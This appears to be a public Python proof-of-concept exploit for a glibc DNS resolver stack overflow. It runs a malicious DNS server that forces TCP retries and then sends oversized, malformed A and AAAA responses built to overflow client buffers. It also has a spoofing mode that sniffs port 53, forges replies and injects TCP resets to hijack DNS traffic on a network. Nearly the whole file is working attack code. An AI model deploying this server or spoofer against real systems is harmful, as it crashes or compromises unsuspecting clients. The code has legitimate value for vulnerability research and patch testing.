#!/usr/bin/python
# -*- coding: UTF-8 -*-
#
# Copyright 2016 Google Inc
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     http://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.
#
# Authors: 
#   Fermin J. Serna <fjserna@google.com>
#   Gynvael Coldwind <gynvael@google.com>
#   Thomas Garnier <thgarnie@google.com>

# Modifications:        tintinweb@oststrom.com <github.com/tintinweb> @ 02/17/2016
# * switch to scapy

import sys
from scapy.all import *
import socket
import time
import threading

BIND = ('127.0.0.1',53) # Insert your ip for bind() here...
OUTQUEUE = []
terminate = False
last_reply = None
reply_now = threading.Event()

#RFC 1035 
class TCPDNSHeader(DNS):
    name = "TCPDNSHeader"
    fields_desc = [ LenField("length",None,fmt="!H") ]

bind_layers(TCP, TCPDNSHeader, dport=53)  
bind_layers(TCPDNSHeader, DNS)
 
def tcpdns_dissect(data):
    while data:
        t = TCPDNSHeader(data)
        yield TCPDNSHeader(data[:t.length+2])
        data = data[t.length+2:]
        
def udp_thread():
  global terminate

  # Handle UDP requests
  sock_udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  sock_udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock_udp.bind(BIND)

  reply_counter = 0
  counter = -1

  answers = []

  while not terminate:
    data, addr = sock_udp.recvfrom(1024)
    pkt = DNS(data)
    print "<== new UDP peer %s"%(repr(addr))

    print "<== recv: (%8d) %s"%(len(pkt), repr(pkt)[:500]+"...")
    # Send truncated flag... so it retries over TCP
    p_out = DNS(id=pkt[DNS].id, 
                # ---> flags
                qr=1,           # is a response
                opcode=0,       # is a query
                aa=0,           # not an authority for domain
                tc=1,           # msg is truncated
                rd=1,           # recursion desired
                ra=1,           # recursion available
                z=0,            # reserved
                ad=0,           # answer authenticated
                cd=0,           # non-auth data unacceptable (disabled)
                #rpcode=0,      # reply code No error
                # <--- flags
                qd=pkt[DNS].qd[0],
                )/('\x00'*2500)

    answers.append((p_out, addr))

    if len(answers) != 2:
      continue

    counter += 1

    if counter % 4 == 2:
      answers = answers[::-1]

    time.sleep(0.01)
    pkt, peer = answers.pop(0)
    sock_udp.sendto(str(pkt),peer)
    print "==> sent: (%8d) %s"%(len(pkt), repr(pkt)[:500]+"...")
    
    reply_now.wait()
    pkt, peer = answers.pop(0)
    sock_udp.sendto(str(pkt),peer)
    print "==> sent: (%8d) %s"%(len(pkt), repr(pkt)[:500]+"...")

  sock_udp.close()


def tcp_thread():
  global terminate
  counter = -1

  #Open TCP socket
  sock_tcp = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  sock_tcp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
  sock_tcp.bind(BIND)
  sock_tcp.listen(10)

  while not terminate:
    answers = []
    conn, addr = sock_tcp.accept()
    counter += 1
    print "<== new TCP peer %s"%(repr(addr))
    # Read entire packet
    data = conn.recv(1024)
    pkt_a = None
    pkt_aaaa = None
    
    for pkt in tcpdns_dissect(data):
        print "<== recv: (%8d) %s"%(len(pkt), repr(pkt)[:500]+"...")
        if pkt[DNS].qd[0].qtype==28: # AAAA
            pkt_aaaa = pkt
        elif pkt[DNS].qd[0].qtype==1: #A
            pkt_a = pkt
        
    # reply 1 - A
    reply = TCPDNSHeader()/ \
               DNS( id=pkt_a[DNS].id, 
                    # ---> flags
                    qr=1,           # is a response
                    opcode=0,       # is a query
                    aa=0,           # not an authority for domain
                    tc=0,           # msg is truncated
                    rd=1,           # recursion desired
                    ra=1,           # recursion available
                    z=0,            # reserved
                    ad=0,           # answer authenticated
                    cd=0,           # non-auth data unacceptable (disabled)
                    #rpcode=0,       # reply code No error
                    # <--- flags
                    an=DNSRR(rrname=".", 
                             type=25185 ,
                             rclass=29190,
                             ttl=1735356263,
                             rdlen=63,
                             rdata='\x03com\x00\x00\x01\x00\x01\x00$\x84(\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03foo\x03bar\x06google\x03com\x00\x00\x1c\x00\x01\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\r\x00\x04DDDD'
                             ),
                    qd=DNSQR(qname=".", 
                             qtype=3 , # A 
                             qclass=26223),
                    )

    answers.append(reply)
    
    # reply 2 - AAAA
    reply = TCPDNSHeader()/DNS(id=pkt_aaaa[DNS].id)/('B'*2300)
    answers.append(reply)
    
    reply_now.set()
    for pkt in answers:
        time.sleep(0.01)
        conn.sendall(str(pkt))
        print "==> sent: (%8d) %s"%(len(pkt), repr(pkt)[:500]+"...")
    
    reply_now.clear()
    print "==! boom - %s"%repr(addr)

  sock_tcp.shutdown(socket.SHUT_RDWR)
  sock_tcp.close()

def main():
  print "[*] mode=srv, bind=%s"%repr(BIND)
  t = threading.Thread(target=udp_thread)
  t.daemon = True
  t.start()
  tcp_thread()
  terminate = True


def main_spoof(iface=None):
  def handle_pkt(pkt):
    global OUTQUEUE
    if len(OUTQUEUE)>=2:
       last_len = 0
       for pkt_out in OUTQUEUE:
           pkt_out[TCP].seq += last_len
           send(pkt_out, iface=conf.iface)
           print "==> sent: (%8d) %s"%(len(pkt_out), repr(pkt_out)[:500]+"...")
           last_len = len(pkt_out[TCP].payload)
       OUTQUEUE=[]

    if not pkt.haslayer(DNS):
       return
    if pkt.haslayer(UDP) and pkt[UDP].dport==53:
       print "<== new UDP peer %s"%(pkt[IP].src)
       print "<== recv: (%8d) %s"%(len(pkt), repr(pkt)[:500]+"...")
       # Send truncated flag... so it retries over TCP
       p_out = DNS(id=pkt[DNS].id,
                # ---> flags
                qr=1,           # is a response
                opcode=0,       # is a query
                aa=0,           # not an authority for domain
                tc=1,           # msg is truncated
                rd=1,           # recursion desired
                ra=1,           # recursion available
                z=0,            # reserved
                ad=0,           # answer authenticated
                cd=0,           # non-auth data unacceptable (disabled)
                #rpcode=0,      # reply code No error
                # <--- flags
                qd=pkt[DNS].qd[0],
                )/('\x00'*2500)

       pkt_out = IP(src=pkt[IP].dst, dst=pkt[IP].src)/UDP(sport=pkt[UDP].dport, dport=pkt[UDP].sport)/p_out
       send(pkt_out,iface=conf.iface)
       print "==> sent: (%8d) %s"%(len(pkt_out), repr(pkt_out)[:500]+"...")
    elif pkt.haslayer(TCP) and pkt[TCP].dport==53 and pkt[TCP].flags==24:
       print "<== new TCP peer %s"%(pkt[IP].src)
       print "<== recv: (%8d) %s"%(len(pkt), repr(pkt)[:500]+"...")

       #-40 IP/TCP hdr_len
       ip_hdr = IP(src=pkt[IP].dst, dst=pkt[IP].src)/TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, flags="PA", seq=pkt[TCP].ack, ack=pkt[TCP].seq+pkt[IP].len-40, window=pkt[TCP].window)

       rst_peer = IP(src=pkt[IP].src, dst=pkt[IP].dst)/TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags="R", seq=pkt[TCP].seq+pkt[IP].len-40)
       send(rst_peer/"hi", iface=conf.iface)
       
       ack = ip_hdr.copy()
       ack[TCP].flags='A'
       send(ack, iface=conf.iface)
       for pkt in (pkt,TCPDNSHeader(pkt[Raw].load)):
         if pkt[DNS].qd[0].qtype==1: # A

           reply = TCPDNSHeader()/ \
               DNS( id=pkt[DNS].id,
                    # ---> flags
                    qr=1,           # is a response
                    opcode=0,       # is a query
                    aa=0,           # not an authority for domain
                    tc=0,           # msg is truncated
                    rd=1,           # recursion desired
                    ra=1,           # recursion available
                    z=0,            # reserved
                    ad=0,           # answer authenticated
                    cd=0,           # non-auth data unacceptable (disabled)
                    #rpcode=0,       # reply code No error
                    # <--- flags
                    an=DNSRR(rrname=".",
                             type=25185 ,
                             rclass=29190,
                             ttl=1735356263,
                             rdlen=63,
                             rdata='\x03com\x00\x00\x01\x00\x01\x00$\x84(\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03foo\x03bar\x06google\x03com\x00\x00\x1c\x00\x01\xc0\x0c\x00\x01\x00\x01\x00\x00\x00\r\x00\x04DDDD'
                             ),
                    qd=DNSQR(qname=".",
                             qtype=3 , # A
                             qclass=26223),
                    )

           pkt_out = ip_hdr/reply
           print "==> prepare: (%8d) %s"%(len(pkt_out), repr(pkt_out)[:500]+"...")
           OUTQUEUE.append(pkt_out) 
         elif pkt[DNS].qd[0].qtype==28: #AAAA
           # reply 2 - AAAA
           reply = TCPDNSHeader()/DNS(id=pkt[DNS].id)/('B'*2300)
           pkt_out = ip_hdr/reply
           print "==> prepare: (%8d) %s"%(len(pkt_out), repr(pkt_out)[:500]+"...")
         
           OUTQUEUE.append(pkt_out)
   
       if len(OUTQUEUE)>=2:
         last_len = 0
         for pkt_out in OUTQUEUE:
           pkt_out[TCP].seq += last_len
           send(pkt_out, iface=conf.iface)
           print "==> sent: (%8d) %s"%(len(pkt_out), repr(pkt_out)[:500]+"...")
           last_len = len(pkt_out[TCP].payload)
         OUTQUEUE=[]
 
  if iface:
    conf.iface = iface
  print "[*] mode=spoof, iface=%s"%conf.iface
  sniff(filter="port 53", prn=handle_pkt, store=0, iface=conf.iface)

if __name__ == "__main__":
  if "--spoof" in sys.argv:
    sys.argv.remove("--spoof")
    main_spoof(sys.argv[1] if len(sys.argv)>1 else None)
  else:
    if len(sys.argv)>1:
      BIND = (sys.argv[1],BIND[1])
    main()
